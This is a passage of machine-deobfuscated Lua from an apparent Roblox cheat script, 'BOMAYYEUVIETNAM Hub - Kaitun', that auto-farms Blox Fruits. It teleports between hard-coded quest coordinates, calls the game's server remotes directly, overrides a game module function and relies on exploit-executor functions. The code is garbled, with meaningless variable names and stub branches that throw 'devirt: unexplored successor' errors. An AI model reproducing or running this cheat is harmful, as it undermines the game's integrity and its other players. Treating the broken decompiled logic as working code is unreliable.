                    cframe[5] = typeAccountScroll
                    cframe[6] = itemLabel1
                    cframe[7] = new2
                    cframe[8] = itemLabel12
                    cframe[9] = textLabel
                    cframe[10] = levelLabel
                    cframe[11] = new3
                    cframe[12] = dropShadow2
                    cframe[13] = main
                    cframe[14] = new4
                    cframe[15] = new5
                    cframe[16] = fromRGB
                    cframe[17] = new6
                    cframe[18] = cframe2
                    cframe[19] = top
                    cframe[20] = udim2
                    cframe[21] = textLabel2
                    cframe[22] = udim22

                    val31[frame] = cframe
                    bomayyeuvietnamKaitunRunning2 = 44
                    frame = "Three_World"
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 126 then
                  cframe:CreateUI({
                    Title = "BOMAYYEUVIETNAM HUB", Subtitle = "Xin ChÃƒÂ o", Backend = { BaseURL = nil, WorkerURL = nil }, })

                  bomayyeuvietnamKaitunRunning2 = 167
                elseif bomayyeuvietnamKaitunRunning2 <= 127 then
                  val23[frame] = cframe(-16122.41, 10.64, -257.35)
                  val23["Sun-kissed Warrior"] = CFrame.new(-16357.31, 20.64, 1005.65)
                  val23["Isle Champion"] = CFrame.new(-16787.32, 20.64, 992.13)
                  val23["Serpent Hunter"] = CFrame.new(-16599.71, 70.59, 1757.91)

                  bomayyeuvietnamKaitunRunning2 = 256
                else
                  divider[divider2] = typeAccountScroll.TextXAlignment.Left

                  local content4 = Instance.new("Frame")
                  content4.Name = "Content"
                  content4.Parent = dutDit
                  content4.Position = UDim2.new(0, 12, 0, 39)

                  divider2 = UDim2.new
                  bomayyeuvietnamKaitunRunning2 = 131
                  divider = "Size"
                  typeAccountScroll = 1
                  fromRGB = -24
                  dutDit = content4
                end

                continue
              elseif bomayyeuvietnamKaitunRunning2 <= 134 then
                if bomayyeuvietnamKaitunRunning2 <= 131 then
                  if bomayyeuvietnamKaitunRunning2 <= 129 then
                    new5[frame] = Vector2.new(0, 0)
                    new5.TextColor3 = val25.Text
                    new5.TextSize = 12
                    new5.TextXAlignment = Enum.TextXAlignment.Left
                    new5.TextTruncate = Enum.TextTruncate.AtEnd

                    frame = Instance.new("ScreenGui")
                    dutDit = Instance
                    bomayyeuvietnamKaitunRunning2 = 329
                    new = "new"
                    continue
                  elseif bomayyeuvietnamKaitunRunning2 <= 130 then
                    val98 = 8
                    break
                  else
                    dutDit[divider] = divider2(typeAccountScroll, fromRGB, 1, -51)
                    dutDit.BackgroundTransparency = 1

                    divider = Instance.new("UIGridLayout")
                    divider.Parent = dutDit
                    divider.CellPadding = UDim2.new(0, 8, 0, 8)

                    typeAccountScroll = UDim2.new
                    bomayyeuvietnamKaitunRunning2 = 194
                    divider2 = "CellSize"
                    fromRGB = 0.3333
                    cframe2 = -6
                    top = 0
                    continue
                  end
                else
                  if bomayyeuvietnamKaitunRunning2 <= 132 then
                    main.Size = UDim2.new(1, -32, 1, -32)
                    main.BackgroundColor3 = val25.Background
                    main.BackgroundTransparency = 0.08
                    main.BorderSizePixel = 0

                    val26(main, 7)
                    val27(main, val25.Primary, 1.25, 0.1)
                    dutDit = UDim2.new
                    bomayyeuvietnamKaitunRunning2 = 227
                    frame = "Position"
                  elseif bomayyeuvietnamKaitunRunning2 <= 133 then
                    itemLabel12 = itemLabel12("TextLabel")
                    textLabel = Instance.new("TextLabel")
                    levelLabel = Instance.new("TextLabel")
                    new3 = Instance.new("TextLabel")
                    dropShadow2 = Instance.new("TextLabel")
                    main = Instance.new("TextLabel")
                    new4 = Instance.new("TextLabel")
                    bomayyeuvietnamKaitunRunning2 = 372
                  else
                    main[dutDit] = 16
                    main.TextXAlignment = Enum.TextXAlignment.Left
                    main.TextYAlignment = Enum.TextYAlignment.Bottom

                    new4.BackgroundTransparency = 1
                    new4.Parent = cframe
                    new4.Position = UDim2.new(0.75, 0, 0.80000001192093, 0)

                    bomayyeuvietnamKaitunRunning2 = 232
                    dutDit = "Size"
                  end

                  continue
                end
              elseif bomayyeuvietnamKaitunRunning2 <= 137 then
                if bomayyeuvietnamKaitunRunning2 <= 135 then
                  divider[fromRGB] = top
                  divider.Size = UDim2.new(1, -24, 1, -48)
                  divider.BackgroundTransparency = 1

                  fromRGB = Instance.new("UIListLayout")
                  fromRGB.Parent = divider
                  fromRGB.Padding = UDim.new(0, 1)

                  udim2 = Enum
                  bomayyeuvietnamKaitunRunning2 = 315
                  top = "SortOrder"
                  continue
                elseif bomayyeuvietnamKaitunRunning2 <= 136 then
                  val98 = 7
                  break
                else
                  new3[dutDit] = "Race: N/A"
                  new3.TextColor3 = Color3.fromRGB(255, 255, 255)
                  new3.TextSize = 16
                  new3.TextXAlignment = Enum.TextXAlignment.Left
                  new3.TextYAlignment = Enum.TextYAlignment.Bottom

                  dropShadow2.BackgroundTransparency = 1
                  bomayyeuvietnamKaitunRunning2 = 179
                  dutDit = "Parent"
                  continue
                end
              elseif bomayyeuvietnamKaitunRunning2 <= 138 then
                new[2] = CFrame.new(
                  1377.125, 246.542007, -5189.951172, 0.034849405, 0, -0.999392569, 0, 1, 0, 0.999392569, 0, 0.034849405
                )

                new[3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469)

                cframe[dutDit] = new
                new = {}
                bomayyeuvietnamKaitunRunning2 = 176
                dutDit = "Command"
                divider = "BuySuperhuman"
                continue
              elseif bomayyeuvietnamKaitunRunning2 <= 139 then
                val98 = 6
                break
              else
                val32[frame] = cframe.new(-1682.12, 50.07, 175.15)
                val32.BuggyQuest1 = CFrame.new(-1151.81, 17.3, 3861.56)
                val32.DesertQuest = CFrame.new(869.77, 5.9, 4454.12)

                cframe = CFrame.new
                bomayyeuvietnamKaitunRunning2 = 118
                frame = "SnowQuest"
                dutDit = 1395.42
                new = 78.03
                continue
              end
            elseif bomayyeuvietnamKaitunRunning2 <= 164 then
              if bomayyeuvietnamKaitunRunning2 <= 152 then
                if bomayyeuvietnamKaitunRunning2 <= 146 then
                  if bomayyeuvietnamKaitunRunning2 <= 143 then
                    if bomayyeuvietnamKaitunRunning2 <= 141 then
                      cframe = request
                      bomayyeuvietnamKaitunRunning2 = 301
                      continue
                    elseif bomayyeuvietnamKaitunRunning2 <= 142 then
                      val23[frame] = CFrame.new(-11823.74, 331.8, -10593.36)
                      val23["Musketeer Pirate"] = CFrame.new(-13406.02, 391.61, -9783.03)
                      val23["Reborn Skeleton"] = CFrame.new(-8766.81, 142.17, 6061.28)

                      cframe = CFrame.new
                      bomayyeuvietnamKaitunRunning2 = 20
                      frame = "Living Zombie"
                      dutDit = -10196.96
                      new = 138.69
                      continue
                    end
                  else
                    val98 = 5
                    break
                  end
                else
                  val98 = 4
                  break
                end
              else
                val98 = 3
                break
              end
            else
              val98 = 2
              break
            end

            break
          end

          val98 = 1
          break
        end

        if val98 == 1 then
          error("devirt: unexplored successor 241:5916")
        end

        if val98 == 2 then
          error("devirt: unexplored successor 241:6865")
        end

        if val98 == 3 then
          error("devirt: unexplored successor 241:9364")
        end

        if val98 == 4 then
          error("devirt: unexplored successor 241:8796")
        end

        if val98 == 5 then
          error("devirt: unexplored successor 241:10514")
        end

        if val98 == 6 then
          frame:Kick("KhÃƒÂ´ng thÃ¡Â»Âƒ tÃ¡ÂºÂ£i giao diÃ¡Â»Â‡n xÃƒÂ¡c thÃ¡Â»Â±c")
          return
        end

        if val98 == 7 then
          warn("[BOMAYYEUVIETNAM Kaitun] Script is already running")
          return
        end

        if val98 == 8 then
          val41.n = 2 + val41.n - 1
          table.move(val41, 1, val41.n, 2, val41)
          val41[1] = fontWeight
          val96 = fromRGB2(table.unpack(val41, 1, val41.n))
          continue
        end

        if val98 == 9 then
          frame:Kick("Executor khÃƒÂ´ng hÃ¡Â»Â— trÃ¡Â»Â£ HTTP request")
          return
        end

        if val98 == 10 then
          return
        end

        textLabel2[dutDit] = new[udim2](255, 255, 255)
        textLabel2.TextSize = 16
        textLabel2.TextYAlignment = Enum.TextYAlignment.Bottom

        new = ColorSequence.new
        udim2 = {}
        fromRGB2 = ColorSequenceKeypoint.new
        local element11 = table.pack(Color3.fromRGB(135, 206, 250))
        val41 = table.pack(table.unpack(element11, 1, element11.n))
        local bomayyeuvietnamKaitunRunning3 = 130
        dutDit = "Color"
        fontWeight = 0
        val97 = nil

        while true do
          if bomayyeuvietnamKaitunRunning3 <= 188 then
            if bomayyeuvietnamKaitunRunning3 <= 93 then
              if bomayyeuvietnamKaitunRunning3 <= 46 then
                if bomayyeuvietnamKaitunRunning3 <= 22 then
                  if bomayyeuvietnamKaitunRunning3 <= 10 then
                    if bomayyeuvietnamKaitunRunning3 <= 4 then
                      if bomayyeuvietnamKaitunRunning3 <= 1 then
                        if bomayyeuvietnamKaitunRunning3 <= 0 then
                          local element12 = table.pack(udim22.new(1, -28, 0, 168))
                          element12.n = 3 + element12.n - 1

                          table.move(element12, 1, element12.n, 3, element12)

                          element12[1] = top
                          element12[2] = udim2

                          dutDit = dutDit(table.unpack(element12, 1, element12.n))

                          fromRGB(textLabel2, divider, "Account stats")
                          fromRGB(under, divider2, "Top weapons")

                          local content5 = Instance.new("Frame")
                          content5.Name = "Content"
                          content5.Parent = divider

                          top = UDim2.new(0, 12, 0, 39)
                          bomayyeuvietnamKaitunRunning3 = 135
                          fromRGB = "Position"
                          divider = content5
                        else
                          bomayyeuvietnamKaitunRunning3 = val19.Remotes.CommF_:InvokeServer(
                            "HornedMan", "Bet"
                          ) == 1 and 183 or 64
                        end
                      elseif bomayyeuvietnamKaitunRunning3 <= 2 then
                        new8.Ms = "Ocean Prophet"
                        new8.Mon = "Ocean Prophets"
                        new8.Quest = "SubmergedQuest2"
                        new8.QLv = 2
                        new8.Next = 2700
                        new8.Fallback = "Sea Chanter"

                        new9 = CFrame.new
                        bomayyeuvietnamKaitunRunning3 = 168
                        val49 = "CQ"
                        val50 = 10880.6855
                        val51 = -2086.20044
                        val52 = 10032.624
                        val53 = -0.321384728
                        val54 = 9.87648434e-8
                        val55 = -0.946948707
                        val56 = 7.13271007e-8
                      elseif bomayyeuvietnamKaitunRunning3 <= 3 then
                        val47[val48] = new8(
                          val49, new9, val50, val51, -9.33109447e-8, -0.355659455, 9.17655143e-8, 1, -2.12154276e-8, 0.355659455, -1.28090019e-8, 0.934615612
                        )

                        val47.CMon = CFrame.new(
                          10808.6006, -2030.36145, 9364.2334, -0.775185347, -0.0359364748, 0.6307109, 0.0615428537, 0.989336014, 0.132010356, -0.628728986, 0.141148239, -0.764707148
                        )

                        val48 = {}
                        bomayyeuvietnamKaitunRunning3 = 166
                        new8 = "Min"
                        val49 = 2650
                      else
                        require(replicatedStorage.Reparent).Unparent = function() return nil end

                        coroutine.wrap(function()
                          local val137 = 0

                          while val137 <= 0 do
                            localPlayer = tostring(game.Players.LocalPlayer.UserId):sub(2, 4)
                              .. tostring(coroutine.running()):sub(11, 15)

                            val137 = 1
                          end
                        end)()

                        localPlayer = players.LocalPlayer
                        placeId = game.PlaceId
                        frame = game
                        bomayyeuvietnamKaitunRunning3 = 192
                      end
                    elseif bomayyeuvietnamKaitunRunning3 <= 7 then
                      if bomayyeuvietnamKaitunRunning3 <= 5 then
                        textLabel[dutDit] = new[fromRGB2]

                        levelLabel.BackgroundTransparency = 1
                        levelLabel.Name = "LevelLabel"
                        levelLabel.Parent = cframe

                        levelLabel.Position = UDim2.new(
                          0.070000000298023, 0, 0.34999999403954, 0
                        )

                        levelLabel.Size = UDim2.new(0, 0, 0, 18)

                        bomayyeuvietnamKaitunRunning3 = 70
                        dutDit = "Selectable"
                        new = false
                      elseif bomayyeuvietnamKaitunRunning3 <= 6 then
                        typeAccountScroll[dutDit] = false

                        itemLabel1.BackgroundTransparency = 1
                        itemLabel1.Name = "ItemLabel1"
                        itemLabel1.Parent = typeAccountScroll
                        itemLabel1.Size = UDim2.new(1, 0, 0, 18)
                        itemLabel1.Selectable = false

                        new = Font.new
                        fontWeight = Enum.FontWeight
                        bomayyeuvietnamKaitunRunning3 = 289
                        dutDit = "FontFace"
                        fromRGB2 = "rbxasset://fonts/families/GothamSSm.json"
                        cframe3 = "Bold"
                      else
                        itemLabel1[new2] = "Snowman"
                        itemLabel1.Mon = "Snowman"
                        itemLabel1.Quest = "SnowQuest"
                        itemLabel1.QLv = 2
                        itemLabel1.Next = 120
                        itemLabel1.Fallback = "Snow Bandit"

                        itemLabel12 = CFrame.new
                        bomayyeuvietnamKaitunRunning3 = 50
                        new2 = "CQ"
                        textLabel = 1389.74451
                        levelLabel = 86.6520844
                        new3 = -1298.90796
                        dropShadow2 = -0.342042685
                        main = 0
                        new4 = 0.939684391
                        new5 = 0
                        fromRGB = 1
                        new6 = 0
                        cframe2 = -0.939684391
                        top = 0
                      end
                    elseif bomayyeuvietnamKaitunRunning3 <= 8 then
                      new2[dutDit] = new(fromRGB2, fontWeight, Enum.FontStyle.Normal)
                      new2.Text = "Item 2"
                      new2.TextColor3 = Color3.fromRGB(255, 255, 255)
                      new2.TextSize = 16

                      itemLabel12.BackgroundTransparency = 1
                      itemLabel12.Name = "ItemLabel1"
                      itemLabel12.Parent = typeAccountScroll

                      new = UDim2
                      bomayyeuvietnamKaitunRunning3 = 209
                      dutDit = "Position"
                    elseif bomayyeuvietnamKaitunRunning3 <= 9 then
                      textLabel[levelLabel] = CFrame.new(
                        -4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268
                      )

                      new3 = CFrame.new
                      bomayyeuvietnamKaitunRunning3 = 63
                      levelLabel = "CMon"
                      dropShadow2 = -5079.98096
                      main = 376.477356
                      new4 = -2194.17139
                      new5 = 0.465965867
                      fromRGB = -3.69776352e-8
                      new6 = 0.884802461
                      cframe2 = 3.40249851e-9
                      top = 1
                      udim2 = 4.00000886e-8
                      textLabel2 = -0.884802461
                      udim22 = -1.56281423e-8
                    else
                      fromRGB[new6] = cframe2(-9516.993164, 178.006515, 6078.465332)
                      fromRGB.CMon = CFrame.new(-9712.03125, 204.695892, 6193.322265)

                      new6 = {
                        Min = 2050, Max = 2074, Ms = "Posessed Mummy", Mon = "Posessed Mummy", Quest = "HauntedQuest2", }

                      bomayyeuvietnamKaitunRunning3 = 239
                      cframe2 = "QLv"
                      top = 2
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 16 then
                    if bomayyeuvietnamKaitunRunning3 <= 13 then
                      if bomayyeuvietnamKaitunRunning3 <= 11 then
                        frame.MaxSize = Vector2.new(390, 66)
                        frame.Parent = new

                        dropShadow2.Position = UDim2.new(0.5, 0, 0.5, 0)
                        dropShadow2.Size = UDim2.new(1, 32, 1, 32)
                        dropShadow2.ImageTransparency = 0.62

                        bomayyeuvietnamKaitunRunning3 = 132
                      elseif bomayyeuvietnamKaitunRunning3 <= 12 then
                        cframe2[dutDit] = new[fromRGB2]

                        top.BackgroundTransparency = 0.9990000128746
                        top.Name = "Top"
                        top.Parent = cframe
                        top.Position = UDim2.new(0.5, 0, 0.050000000745058, 0)
                        top.Size = UDim2.new(0, 0, 0, 18)

                        bomayyeuvietnamKaitunRunning3 = 364
                        dutDit = "Selectable"
                        new = false
                      else
                        new4[new5] = fromRGB(cframe2, 300, 0, 18)

                        new4.FontFace = Font.new(
                          "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                        )

                        new4.Text = "BOMAYYEUVIETNAM Hub - Kaitun"

                        fromRGB = Color3.fromRGB
                        bomayyeuvietnamKaitunRunning3 = 225
                        new5 = "TextColor3"
                        cframe2 = 135
                        udim2 = 206
                      end
                    elseif bomayyeuvietnamKaitunRunning3 <= 14 then
                      under[uiGradient] = new7
                      under.Mon = "Galley Captain"
                      under.Quest = "FountainQuest"
                      under.QLv = 2
                      under.Next = 9999
                      under.Fallback = "Galley Pirate"

                      new7 = CFrame.new
                      bomayyeuvietnamKaitunRunning3 = 348
                      uiGradient = "CQ"
                      fromRGB2 = 5259.81982
                      fontWeight = 37.3500175
                      cframe3 = 4050.0293
                      val42 = 0.087131381
                      val43 = 0
                      val44 = 0.996196866
                      val45 = 0
                      val46 = 1
                      val47 = 0
                      val48 = -0.996196866
                      new8 = 0
                      val49 = 0.087131381
                    elseif bomayyeuvietnamKaitunRunning3 <= 15 then
                      divider[divider2] = 300
                      divider2 = { Name = "Dragon Claw", Target = 300 }
                      typeAccountScroll = { Name = "Superhuman", Target = 300 }
                      itemLabel1 = { Name = "Black Leg", Target = 400 }
                      new2 = { Name = "Death Step", BuyOnly = true }
                      itemLabel12 = {}
                      bomayyeuvietnamKaitunRunning3 = 53
                    else
                      local element13 = table.pack(fromRGB2[fontWeight](1, 0))

                      udim2[1] = udim22
                      udim2[2] = uiGradient

                      table.move(element13, 1, element13.n, 3, udim2)
                      dutDit[fromRGB] = cframe2(udim2)

                      val25 = {
                        Background = Color3.fromRGB(10, 15, 24), Surface = Color3.fromRGB(17, 25, 38), }

                      fromRGB = Color3.fromRGB
                      bomayyeuvietnamKaitunRunning3 = 220
                      dutDit = "SurfaceAlt"
                      cframe2 = 22
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 19 then
                    if bomayyeuvietnamKaitunRunning3 <= 17 then
                      dutDit.CMon = CFrame.new(
                        -737.026123, 10.1748352, 2392.57959, 0.272128761, 0, -0.962260842, 0, 1, 0, 0.962260842, 0, 0.272128761
                      )

                      new = {
                        Min = 725, Max = 774, Ms = "Mercenary", Mon = "Mercenary", }

                      bomayyeuvietnamKaitunRunning3 = 93
                      divider = "Quest"
                    elseif bomayyeuvietnamKaitunRunning3 <= 18 then
                      new[divider] = divider2.new(-7904.57373, 5584.37646, -459.62973)

                      divider = {
                        Min = 60, Max = 74, Ms = "Desert Bandit", Mon = "Desert Bandit", Quest = "DesertQuest", QLv = 1, Next = nil, }

                      typeAccountScroll = CFrame
                      bomayyeuvietnamKaitunRunning3 = 95
                      divider2 = "CQ"
                      itemLabel1 = "new"
                    else
                      bomayyeuvietnamKaitunRunning3 = dutDit and 139 or 126
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 20 then
                    val23[frame] = cframe(dutDit, new, 5955.21)
                    val23["Demonic Soul"] = CFrame.new(-9493.12, 172.17, 6149.69)
                    val23["Posessed Mummy"] = CFrame.new(-9579, 6, 6194)
                    val23["Peanut Scout"] = CFrame.new(-1948.4, 9.74, -9984.92)

                    cframe = CFrame
                    bomayyeuvietnamKaitunRunning3 = 312
                    frame = "Peanut President"
                  elseif bomayyeuvietnamKaitunRunning3 <= 21 then
                    dropShadow2[main] = new4(
                      new5, fromRGB, new6, cframe2, top, udim2, textLabel2, udim22, under, uiGradient, new7, fromRGB2
                    )

                    main = {
                      Min = 1175, Max = 1199, Ms = "Magma Ninja", Mon = "Magma Ninja", Quest = "FireSideQuest", QLv = 1, Next = 1200, }

                    new5 = CFrame.new
                    bomayyeuvietnamKaitunRunning3 = 345
                    new4 = "CQ"
                    fromRGB = -5428.03174
                    new6 = 15.0622921
                    cframe2 = -5299.43457
                    top = -0.882952213
                  else
                    dropShadow2[main] = new4
                    dropShadow2.Ms = "Toga Warrior"
                    dropShadow2.Mon = "Toga Warrior"
                    dropShadow2.Quest = "ColosseumQuest"
                    dropShadow2.QLv = 1
                    dropShadow2.Next = 275

                    new4 = CFrame.new
                    bomayyeuvietnamKaitunRunning3 = 255
                    main = "CQ"
                    new5 = -1576.11743
                    fromRGB = 7.38933945
                    new6 = -2983.30762
                    cframe2 = 0.576966345
                    top = 1.22114863e-9
                    udim2 = 0.816767931
                    textLabel2 = -3.58496594e-10
                    udim22 = 1
                    under = -1.24185606e-9
                    uiGradient = -0.816767931
                    new7 = 4.2370063e-10
                    fromRGB2 = 0.576966345
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 34 then
                  if bomayyeuvietnamKaitunRunning3 <= 28 then
                    if bomayyeuvietnamKaitunRunning3 <= 25 then
                      if bomayyeuvietnamKaitunRunning3 <= 23 then
                        local element14 = table.pack(top(udim2, udim22, uiGradient, 132))
                        element14.n = 3 + element14.n - 1

                        table.move(element14, 1, element14.n, 3, element14)

                        element14[1] = divider
                        element14[2] = divider2

                        local val138 = dutDit(table.unpack(element14, 1, element14.n))
                        local udim5 = UDim2.new(0.5, 7, 0, 62)

                        local udim23 = table.pack(UDim2.new(0.5, -21, 0, 132))
                        udim23.n = 3 + udim23.n - 1

                        table.move(udim23, 1, udim23.n, 3, udim23)

                        udim23[1] = "ItemsPanel"
                        udim23[2] = udim5

                        divider2 = dutDit(table.unpack(udim23, 1, udim23.n))
                        udim2 = UDim2.new(0, 14, 0, 208)
                        udim22 = UDim2
                        bomayyeuvietnamKaitunRunning3 = 0
                        top = "ProgressPanel"
                        divider = val138
                      elseif bomayyeuvietnamKaitunRunning3 <= 24 then
                        frame[divider2] = typeAccountScroll[dropShadow2].Sibling
                        frame.DisplayOrder = 10

                        dutDit.Name = "dut dit"
                        dutDit.Parent = frame
                        dutDit.AnchorPoint = Vector2.new(0.10000000149012, 0.10000000149012)
                        dutDit.BackgroundColor3 = val25.Primary

                        divider2 = UDim2.new(0, 20, 0.1, -6)
                        bomayyeuvietnamKaitunRunning3 = 354
                        frame = "Position"
                      else
                        new[divider] = "PiratePortQuest"
                        new.QLv = 2
                        new.Next = 1575
                        new.Fallback = "Pirate Millionaire"

                        new.CQ = CFrame.new(
                          -290.074677, 42.9034653, 5581.58984, 0.965929627, 0, -0.258804798, 0, 1, 0, 0.258804798, 0, 0.965929627
                        )

                        divider2 = CFrame
                        bomayyeuvietnamKaitunRunning3 = 328
                        divider = "CMon"
                        typeAccountScroll = "new"
                      end
                    elseif bomayyeuvietnamKaitunRunning3 <= 26 then
                      pcall(setfpscap, getgenv().Configs["FPS Limit"])
                      bomayyeuvietnamKaitunRunning3 = 235
                    elseif bomayyeuvietnamKaitunRunning3 <= 27 then
                      frame:WaitForChild("Level")

                      localPlayer:WaitForChild("Data"):WaitForChild("Fragments")
                      localPlayer:WaitForChild("Data"):WaitForChild("Beli")

                      val20 = 2800
                      game:service("VirtualInputManager")
                      frame = game
                      bomayyeuvietnamKaitunRunning3 = 204
                    else
                      new3[dropShadow2] = main

                      new3.CQ = CFrame.new(
                        -6064.06885, 15.2422857, -4902.97852, 0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, 0.453972578
                      )

                      main = CFrame.new
                      bomayyeuvietnamKaitunRunning3 = 113
                      dropShadow2 = "CMon"
                      new4 = -5769.2041
                      new5 = 37.9288292
                      fromRGB = -4468.38721
                      new6 = -0.569419742
                      cframe2 = -2.49055017e-8
                      top = 0.822046936
                      udim2 = -6.96206541e-8
                      textLabel2 = 1
                      udim22 = -1.79282633e-8
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 31 then
                    if bomayyeuvietnamKaitunRunning3 <= 29 then
                      bomayyeuvietnamKaitunRunning3 = frame and 275 or 363
                    elseif bomayyeuvietnamKaitunRunning3 <= 30 then
                      top[udim2] = textLabel2.new(
                        -1876.95959, 192.610947, -10542.2939, 0.0553516336, -2.83836812e-8, 0.998466909, -6.89634405e-10, 1, 2.84654931e-8, -0.998466909, -2.26418861e-9, 0.0553516336
                      )

                      udim2 = {
                        Min = 2125, Max = 2149, Ms = "Ice Cream Chef", Mon = "Ice Cream Chef", Quest = "IceCreamIslandQuest", }

                      bomayyeuvietnamKaitunRunning3 = 78
                    else
                      frame[udim2] = udim22(uiGradient, fromRGB2, 0, 420)

                      val24.Size = UDim2.new(1, -24, 1, -24)
                      val24.BackgroundColor3 = val25.Background
                      val24.BackgroundTransparency = 0.04
                      val24.BorderSizePixel = 0

                      val26(val24, 9)
                      val27(val24, val25.Primary, 1.5, 0.05)
                      bomayyeuvietnamKaitunRunning3 = 257
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 32 then
                    textLabel[levelLabel] = new3[dropShadow2](
                      -11194.541992, 442.027954, -8608.80664
                    )

                    levelLabel = {
                      Min = 1825, Max = 1849, Ms = "Forest Pirate", Mon = "Forest Pirate", Quest = "DeepForestIsland", QLv = 1, Next = 1850, }

                    dropShadow2 = CFrame.new
                    bomayyeuvietnamKaitunRunning3 = 349
                    new3 = "CQ"
                  elseif bomayyeuvietnamKaitunRunning3 <= 33 then
                    val46[val47] = val48(
                      new8, val49, new9, 0.934615612, -9.33109447e-8, -0.355659455, 9.17655143e-8, 1, -2.12154276e-8, 0.355659455, -1.28090019e-8, 0.934615612
                    )

                    val46.CMon = CFrame.new(
                      11019.1318, -2146.06812, 9342.3916, -0.719955266, -1.74275385e-8, 0.69402045, 5.76556367e-8, 1, 8.49211546e-8, -0.69402045, 1.01153624e-7, -0.719955266
                    )

                    val47 = {}
                    bomayyeuvietnamKaitunRunning3 = 82
                    val48 = "Min"
                  else
                    bomayyeuvietnamKaitunRunning3 = frame and 1 or 64
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 40 then
                  if bomayyeuvietnamKaitunRunning3 <= 37 then
                    if bomayyeuvietnamKaitunRunning3 <= 35 then
                      new6.CQ = CFrame.new(
                        968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-8, -0.493826836, 1.44108379e-8, 1, 5.38534195e-9, 0.493826836, -2.43357912e-9, -0.869560242
                      )

                      new6.CMon = CFrame.new(917.96057, 136.89932, 33343.41406)

                      cframe2 = { Min = 1325 }
                      bomayyeuvietnamKaitunRunning3 = 306
                      top = "Max"
                    elseif bomayyeuvietnamKaitunRunning3 <= 36 then
                      new6[dutDit] = new[fromRGB2](0, 33, 0, 18)
                      new6.Selectable = false

                      new6.FontFace = Font.new(
                        "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                      )

                      new6.Text = "Frag: N/A"

                      new = Color3
                      bomayyeuvietnamKaitunRunning3 = 58
                      dutDit = "TextColor3"
                    else
                      new5[fromRGB] = new6(
                        cframe2, top, udim2, textLabel2, udim22, under, -1.23782129e-7, 1, -4.93306951e-9, -0.982100308, -1.22495649e-7, -0.188358366
                      )

                      fromRGB = {
                        Min = 375, Max = 399, Ms = "Fishman Warrior", Mon = "Fishman Warrior", Quest = "FishmanQuest", QLv = 1, Next = 400, }

                      cframe2 = CFrame
                      bomayyeuvietnamKaitunRunning3 = 265
                      new6 = "CQ"
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 38 then
                    typeAccountScroll[itemLabel1] = new2(
                      -2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268
                    )

                    typeAccountScroll.CMon = CFrame.new(
                      -2842.69922, 72.9919434, -2901.90479, -0.762281299, 0, -0.64724648, 0, 1.00000012, 0, 0.64724648, 0, -0.762281299
                    )

                    bomayyeuvietnamKaitunRunning3 = 226
                  elseif bomayyeuvietnamKaitunRunning3 <= 39 then
                    dutDit[new] = 100

                    new = {
                      Item = "Wardens Sword", Boss = "Chief Warden", Type = "Sword", Sea = 1, MinLevel = 100, }

                    divider = {
                      Item = "Pole (1st Form)", Boss = "Thunder God", Type = "Sword", Sea = 1, }

                    bomayyeuvietnamKaitunRunning3 = 267
                  else
                    function helper4(val139)
                      local val140 = 11
                      local kaitunInventoryCache3 = nil
                      local val141 = nil

                      while true do
                        if val140 <= 6 then
                          if val140 <= 2 then
                            if val140 <= 0 then
                              local time3 = kaitunInventoryCache3.Time

                              if time3 then
                                val140 = 7
                                val141 = time3
                              else
                                val140 = 2
                              end
                            elseif val140 <= 1 then
                              val141 = type(kaitunInventoryCache3.ByName) ~= "table"
                              val140 = 13
                            else
                              val140 = 7
                              val141 = 0
                            end

                            continue
                          end

                          if val140 <= 4 then
                            if val140 <= 3 then
                              for key7 in pairs(val33) do
                                local element15 = kaitunInventoryCache3.ByName[key7]

                                if element15 then
                                  val39[key7] = math.max(
                                    val39[key7] or 0, tonumber(element15.Mastery) or 0
                                  )
                                end
                              end

                              val40 = val141
                              val140 = 4
                              val139 = true
                              continue
                            end

                            return val139
                          end

                          if val140 <= 5 then
                            val140 = val139 and 9 or 3
                          else
                            val140 = val141 and 13 or 1
                          end
                        else
                          if val140 <= 9 then
                            if val140 <= 7 then
                              local val142 = not val139

                              if val142 then
                                val140 = 12
                              else
                                val140 = 5
                                val139 = val142
                              end

                              continue
                            end

                            break
                          end

                          if val140 <= 11 then
                            if val140 <= 10 then
                              val141 = kaitunInventoryCache3.Ready ~= true
                              val140 = 6
                            else
                              GetInventory(val139 == true)
                              kaitunInventoryCache3 = getgenv().KaitunInventoryCache
                              local val143 = type(kaitunInventoryCache3) ~= "table"

                              if val143 then
                                val140 = 6
                                val141 = val143
                              else
                                val140 = 10
                              end
                            end
                          elseif val140 <= 12 then
                            val139 = val40 == val141
                            val140 = 5
                          else
                            val140 = val141 and 8 or 0
                          end
                        end
                      end

                      if val140 <= 8 then
                        return false
                      end

                      return true
                    end

                    helper2 = nil

                    function helper2(val144)
                      local val145 = 0
                      local findFirstChild3 = nil

                      while true do
                        if not (val145 <= 3) then
                          if val145 <= 5 then
                            if val145 <= 4 then
                              val145 = findFirstChild3 and 7 or 6
                            else
                              findFirstChild3 = localPlayer.Backpack:FindFirstChild(val144)
                              val145 = 7
                            end
                          elseif val145 <= 6 then
                            local backpack3 = localPlayer.Backpack

                            if backpack3 then
                              val145 = 5
                            else
                              val145 = 7
                              findFirstChild3 = backpack3
                            end
                          else
                            val145 = findFirstChild3 and 2 or 3
                          end

                          continue
                        end

                        if val145 <= 1 then
                          if val145 <= 0 then
                            local character3 = localPlayer.Character

                            if character3 then
                              val145 = 1
                            else
                              val145 = 4
                              findFirstChild3 = character3
                            end
                          else
                            findFirstChild3 = localPlayer.Character:FindFirstChild(val144)
                            val145 = 4
                          end

                          continue
                        end

                        if not (val145 <= 2) then
                          findFirstChild3 = localPlayer:FindFirstChild(val144)
                          val145 = 2
